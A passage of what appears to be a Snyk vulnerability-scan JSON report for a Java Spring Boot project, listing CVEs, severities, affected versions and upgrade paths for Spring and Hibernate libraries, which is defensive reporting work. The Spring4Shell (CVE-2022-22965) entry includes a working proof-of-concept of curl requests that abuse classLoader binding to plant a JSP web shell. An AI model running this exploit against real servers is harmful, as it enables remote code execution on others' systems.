      "mavenModuleName": {
        "artifactId": "hibernate-validator",
        "groupId": "org.hibernate"
      },
      "modificationTime": "2020-12-14T14:41:02.408899Z",
      "moduleName": "org.hibernate:hibernate-validator",
      "packageManager": "maven",
      "packageName": "org.hibernate:hibernate-validator",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-01-09T14:55:12Z",
      "references": [
        {
          "title": "Apache Security Advisory",
          "url": "https://lists.apache.org/thread.html/r87b7e2d22982b4ca9f88f5f4f22a19b394d2662415b233582ed22ebf@%3Cnotifications.accumulo.apache.org%3E"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/hibernate/hibernate-validator/commit/124b7dd6d9a4ad24d4d49f74701f05a13e56ceee"
        },
        {
          "title": "Hibernator Security Release Blog",
          "url": "https://in.relation.to/2019/11/20/hibernate-validator-610-6018-released/"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-10219"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,6.0.18.Final)",
          "[6.1.0.Alpha1,6.1.0.Final)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-validation@1.3.1.RELEASE",
        "org.hibernate:hibernate-validator@5.2.2.Final"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.hibernate:hibernate-validator",
      "version": "5.2.2.Final"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-09-18T14:36:44.859594Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.6,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Improper Input Validation. The protections against Reflected File Download attacks from CVE-2015-5211 may be bypassed depending on the browser used through the use of a `jsessionid` path parameter.\n## Remediation\nUpgrade `org.springframework:spring-web` to version 4.3.29.RELEASE, 5.0.19.RELEASE, 5.1.18.RELEASE, 5.2.9.RELEASE or higher.\n## References\n- [CVE-2015-5211](https://tanzu.vmware.com/security/cve-2015-5211)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2020-5421)\n",
      "disclosureTime": "2020-09-18T14:23:55Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "4.3.29.RELEASE",
        "5.0.19.RELEASE",
        "5.1.18.RELEASE",
        "5.2.9.RELEASE"
      ],
      "functions": [
        {
          "functionId": {
            "className": "WebUtils",
            "filePath": "org/springframework/web/util/WebUtils.java",
            "functionName": "parseMatrixVariables"
          },
          "version": [
            "[3.2.0.RELEASE,4.3.29.RELEASE)",
            "[5.0.0.RELEASE, 5.0.19.RELEASE)",
            "[5.1.0.RELEASE, 5.1.18.RELEASE)",
            "[5.2.0.RELEASE, 5.2.9.RELEASE)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.web.util.WebUtils",
            "functionName": "parseMatrixVariables"
          },
          "version": [
            "[3.2.0.RELEASE,4.3.29.RELEASE)",
            "[5.0.0.RELEASE, 5.0.19.RELEASE)",
            "[5.1.0.RELEASE, 5.1.18.RELEASE)",
            "[5.2.0.RELEASE, 5.2.9.RELEASE)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-1009832",
      "identifiers": {
        "CVE": [
          "CVE-2020-5421"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-web",
        "groupId": "org.springframework"
      },
      "modificationTime": "2020-11-01T15:06:12.285684Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-09-18T16:17:53Z",
      "references": [
        {
          "title": "CVE-2015-5211",
          "url": "https://tanzu.vmware.com/security/cve-2015-5211"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2020-5421"
        }
      ],
      "semver": {
        "vulnerable": [
          "[3.2.0.RELEASE,4.3.29.RELEASE)",
          "[5.0.0.RELEASE, 5.0.19.RELEASE)",
          "[5.1.0.RELEASE, 5.1.18.RELEASE)",
          "[5.2.0.RELEASE, 5.2.9.RELEASE)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Improper Input Validation",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-web@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.1.17.RELEASE",
        "org.springframework:spring-web@5.1.18.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2018-10-18T10:47:34.201366Z",
      "credit": [
        "Nicholas Starke"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n[org.springframework:spring-web](https://github.com/spring-projects/spring-framework) is a package that provides a comprehensive programming and configuration model for modern Java-based enterprise applications - on any kind of deployment platform.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). A malicious user could add a range header with a high number of ranges, or with wide ranges that overlap, or both, for a denial of service attack.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `org.springframework:spring-web` to version 4.3.20.RELEASE, 5.0.10.RELEASE, 5.1.1.RELEASE or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/423aa28ed584b4ff6e5bad218c09beef5e91951e)\n- [Pivotal Security Report](https://pivotal.io/security/cve-2018-15756)\n",
      "disclosureTime": "2018-10-03T10:44:07Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "4.3.20.RELEASE",
        "5.0.10.RELEASE",
        "5.1.1.RELEASE"
      ],
      "functions": [
        {
          "functionId": {
            "className": "HttpRange",
            "filePath": "org/springframework/http/HttpRange.java",
            "functionName": "parseRanges"
          },
          "version": [
            "[4.2.0, 4.3.20)",
            "[5.0.0, 5.0.10)",
            "[5.1.0, 5.1.1)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.http.HttpRange",
            "functionName": "parseRanges"
          },
          "version": [
            "[4.2.0, 4.3.20)",
            "[5.0.0, 5.0.10)",
            "[5.1.0, 5.1.1)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-72470",
      "identifiers": {
        "CVE": [
          "CVE-2018-15756"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-ffvq-7w96-97p7"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-web",
        "groupId": "org.springframework"
      },
      "modificationTime": "2020-12-14T14:40:55.081576Z",
      "moduleName": "org.springframework:spring-web",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-web",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-10-18T10:43:53Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/423aa28ed584b4ff6e5bad218c09beef5e91951e"
        },
        {
          "title": "Pivotal Security Report",
          "url": "https://pivotal.io/security/cve-2018-15756"
        }
      ],
      "semver": {
        "vulnerable": [
          "[4.2.0.RELEASE, 4.3.20.RELEASE)",
          "[5.0.0.RELEASE, 5.0.10.RELEASE)",
          "[5.1.0.RELEASE, 5.1.1.RELEASE)"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "low",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-web@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.5.17.RELEASE",
        "org.springframework:spring-web@4.3.20.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-web",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2022-01-02T11:14:46.053186Z",
      "credit": [
        "Dennis Kennedy"
      ],
      "cvssScore": 4.3,
      "description": "## Overview\n[org.springframework:spring-core](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22spring-core%22) is a core package within the spring-framework that contains multiple classes and utilities.\n\nAffected versions of this package are vulnerable to Improper Output Neutralization for Logs when a user provides malicious input, causing insertion of additional log entries.\n## Remediation\nUpgrade `org.springframework:spring-core` to version 5.3.12, 5.2.18 or higher.\n## References\n- [Github Commit](https://github.com/spring-projects/spring-framework/commit/346b75580267dc5d8d257be198d5841ce4e1add5)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2021-22096)\n",
      "disclosureTime": "2021-10-27T12:52:59Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.3.12",
        "5.2.18"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2329097",
      "identifiers": {
        "CVE": [
          "CVE-2021-22096"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-core",
        "groupId": "org.springframework"
      },
      "modificationTime": "2022-01-02T11:14:46.378072Z",
      "moduleName": "org.springframework:spring-core",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-10-27T16:55:13Z",
      "references": [
        {
          "title": "Github Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/346b75580267dc5d8d257be198d5841ce4e1add5"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2021-22096"
        }
      ],
      "semver": {
        "vulnerable": [
          "[5.3.0,5.3.12)",
          "[,5.2.18)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Output Neutralization for Logs",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.3.1.RELEASE",
        "org.springframework:spring-core@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.4.12",
        "org.springframework.boot:spring-boot-starter@2.4.12",
        "org.springframework:spring-core@5.3.12"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-core",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2022-01-06T12:31:26.181234Z",
      "credit": [
        "psytester"
      ],
      "cvssScore": 4.3,
      "description": "## Overview\n[org.springframework:spring-core](http://search.maven.org/#search%7Cga%7C1%7Ca%3A%22spring-core%22) is a core package within the spring-framework that contains multiple classes and utilities.\n\nAffected versions of this package are vulnerable to Improper Input Validation when a user provides malicious input, causing insertion of additional log entries.\n## Remediation\nUpgrade `org.springframework:spring-core` to version 5.2.19.RELEASE, 5.3.14 or higher.\n## References\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2021-22060)\n",
      "disclosureTime": "2022-01-06T11:18:34Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.2.19.RELEASE",
        "5.3.14"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2330878",
      "identifiers": {
        "CVE": [
          "CVE-2021-22060"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-core",
        "groupId": "org.springframework"
      },
      "modificationTime": "2022-01-25T15:25:00.337700Z",
      "moduleName": "org.springframework:spring-core",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-01-06T17:17:24.995166Z",
      "references": [
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2021-22060"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.2.19.RELEASE)",
          "[5.3.0,5.3.14)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Improper Input Validation",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.3.1.RELEASE",
        "org.springframework:spring-core@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.5.8",
        "org.springframework.boot:spring-boot-starter@2.5.8",
        "org.springframework:spring-core@5.3.14"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-core",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "alternativeIds": [],
      "creationTime": "2022-03-29T10:05:31.971026Z",
      "credit": [
        "4ra1n"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) by providing a specially crafted SpEL expression, that might result in an `OutOfMemoryError`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.springframework:spring-expression` to version 5.3.17 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/83ac65915871067c39a4fb255e0d484c785c0c11)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/28145)\n- [Pivotal Security Advisory](https://pivotal.io/security/cve-2022-22950)\n",
      "disclosureTime": "2022-03-29T09:51:43Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.3.17"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2434828",
      "identifiers": {
        "CVE": [
          "CVE-2022-22950"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-expression",
        "groupId": "org.springframework"
      },
      "modificationTime": "2022-03-29T14:24:08.980360Z",
      "moduleName": "org.springframework:spring-expression",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-expression",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-29T14:24:08.978321Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/83ac65915871067c39a4fb255e0d484c785c0c11"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/28145"
        },
        {
          "title": "Pivotal Security Advisory",
          "url": "https://pivotal.io/security/cve-2022-22950"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.3.17)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Denial of Service (DoS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-webmvc@4.2.4.RELEASE",
        "org.springframework:spring-expression@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.5.11",
        "org.springframework:spring-webmvc@5.3.17",
        "org.springframework:spring-expression@5.3.17"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-expression",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F",
      "alternativeIds": [],
      "creationTime": "2022-03-30T21:42:31.436000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[org.springframework:spring-beans](https://www.baeldung.com/spring-bean) is a package that is the basis for Spring Framework's IoC container. The BeanFactory interface provides an advanced configuration mechanism capable of managing any type of object.\n\nAffected versions of this package are vulnerable to Remote Code Execution via manipulation of `ClassLoader` that is achievable with a POST HTTP request. This could allow an attacker to execute a webshell on a victim's application (TomCat), or download arbitrary files from the server (Payara/Glassfish).\r\n\r\n**Note:** \r\n* Current public exploits require victim applications to be built with JRE version 9 (or above) and to be deployed on either Tomcat, Payara or Glassfish. \r\n* However, we have confirmed that it is technically possible for additional exploits to work under additional application configurations as well. \r\n* As such while we recommend users prioritise first remediating against the configuration described above, for full protection we also recommend upgrading all vulnerable versions to the fixed `spring-beans` version regardless of the application configuration.\r\n\r\n### Update Log \r\n* **31/03/2022 -** Severity was raised from 8.1 to 9.8\r\n* **08/04/2022 -** Advisory was updated to reflect that Snyk's security research team was able to author a working PoC of this vulnerability against applications that are deployed on Payara (which is based on Glassfish). \r\n\r\n\r\n## PoC\r\n```java\r\n1/ docker run -p 8888:8080 --rm --interactive --tty --name vm1 tomcat:9.0\r\n2/ ./mvnw install\r\n3/ docker cp target/handling-form-submission-complete.war vm1:/usr/local/tomcat/webapps\r\n4/ curl -X POST \\\r\n  -H \"pre:<%\" \\\r\n  -H \"post:;%>\" \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}iSystem.out.println(123)%{post}i' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/handling-form-submission-complete' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \\\r\n  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \\\r\n  http://localhost:8888/handling-form-submission-complete/greeting\r\n5/ curl http://localhost:8888/handling-form-submission-complete/rce.jsp\r\n```\n## Remediation\nUpgrade `org.springframework:spring-beans` to version 5.2.20, 5.3.18 or higher.\n## References\n- [CyberKendra Post](https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html)\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15)\n- [LunaSec Blog](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)\n- [Payara Blogpost](https://blog.payara.fish/payara-and-spring4shell)\n- [Payara PoC](https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara)\n- [Snyk Blog - Technical Breakdown](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/)\n- [Snyk PoC](https://github.com/Kirill89/CVE-2022-22965-PoC)\n- [Spring Security Announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)\n- [Spring Tomcat Mitigation Advice](https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative)\n",
      "disclosureTime": "2022-03-30T21:42:24Z",
      "exploit": "Functional",
      "fixedIn": [
        "5.2.20",
        "5.3.18"
      ],
      "functions": [
        {
          "functionId": {
            "className": "CachedIntrospectionResults",
            "filePath": "org/springframework/beans/CachedIntrospectionResults.java",
            "functionName": "<init>"
          },
          "version": [
            "[ ,5.2.20)",
            "[5.3.0, 5.3.18)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "org.springframework.beans.CachedIntrospectionResults",
            "functionName": "<init>"
          },
          "version": [
            "[ ,5.2.20)",
            "[5.3.0, 5.3.18)"
          ]
        }
      ],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2436751",
      "identifiers": {
        "CVE": [
          "CVE-2022-22965"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-beans",
        "groupId": "org.springframework"
      },
      "modificationTime": "2022-04-18T15:25:01.366786Z",
      "moduleName": "org.springframework:spring-beans",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-beans",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-03-30T22:32:44Z",
      "references": [
        {
          "title": "CyberKendra Post",
          "url": "https://www.cyberkendra.com/2022/03/springshell-rce-0-day-vulnerability.html"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15"
        },
        {
          "title": "LunaSec Blog",
          "url": "https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/"
        },
        {
          "title": "Payara Blogpost",
          "url": "https://blog.payara.fish/payara-and-spring4shell"
        },
        {
          "title": "Payara PoC",
          "url": "https://github.com/CalumHutton/CVE-2022-22965-PoC_Payara"
        },
        {
          "title": "Snyk Blog - Technical Breakdown",
          "url": "https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/"
        },
        {
          "title": "Snyk PoC",
          "url": "https://github.com/Kirill89/CVE-2022-22965-PoC"
        },
        {
          "title": "Spring Security Announcement",
          "url": "https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement"
        },
        {
          "title": "Spring Tomcat Mitigation Advice",
          "url": "https://spring.io/blog/2022/04/01/spring-framework-rce-mitigation-alternative"
        }
      ],
      "semver": {
        "vulnerable": [
          "[ ,5.2.20)",
          "[5.3.0, 5.3.18)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Remote Code Execution",
      "severityWithCritical": "critical",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-web@4.2.4.RELEASE",
        "org.springframework:spring-beans@4.2.4.RELEASE"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.5.12",
        "org.springframework:spring-web@5.3.18",
        "org.springframework:spring-beans@5.3.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.springframework:spring-beans",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2022-04-14T11:54:10.207823Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 3.7,
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Improper Handling of Case Sensitivity via the patterns for `disallowedFields` on a `DataBinder`. As a result, a field is not effectively protected unless it is listed with both upper and lower case for the first character of the field, including nested fields within the property path.\n## Remediation\nUpgrade `org.springframework:spring-context` to version 5.2.21, 5.3.19 or higher.\n## References\n- [GitHub Commit](https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea)\n- [GitHub Issue](https://github.com/spring-projects/spring-framework/issues/28333)\n- [Spring Blog Post](https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968)\n- [Tanzu Advisory](https://tanzu.vmware.com/security/cve-2022-22968)\n",
      "disclosureTime": "2022-04-14T11:43:54Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "5.2.21",
        "5.3.19"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGSPRINGFRAMEWORK-2689634",
      "identifiers": {
        "CVE": [
          "CVE-2022-22968"
        ],
        "CWE": [
          "CWE-178"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "spring-context",
        "groupId": "org.springframework"
      },
      "modificationTime": "2022-04-14T12:09:40.109582Z",
      "moduleName": "org.springframework:spring-context",
      "packageManager": "maven",
      "packageName": "org.springframework:spring-context",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2022-04-14T12:09:40.107275Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/spring-projects/spring-framework/commit/833e750175349ab4fd502109a8b41af77e25cdea"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/spring-projects/spring-framework/issues/28333"
        },
        {
          "title": "Spring Blog Post",
          "url": "https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968"
        },
        {
          "title": "Tanzu Advisory",
          "url": "https://tanzu.vmware.com/security/cve-2022-22968"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,5.2.21)",
          "[5.3.0, 5.3.19)"
        ]
      },
      "severity": "low",
      "socialTrendAlert": false,
      "title": "Improper Handling of Case Sensitivity",
      "severityWithCritical": "low",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework:spring-web@4.2.4.RELEASE",
        "org.springframework:spring-context@4.2.4.RELEASE"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "org.springframework:spring-context",
      "version": "4.2.4.RELEASE"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
      "alternativeIds": [],
      "creationTime": "2017-02-22T07:28:31.551000Z",
      "credit": [
        "Shumpei Asahara",
        "Yuji Ito"
      ],
      "cvssScore": 7.5,
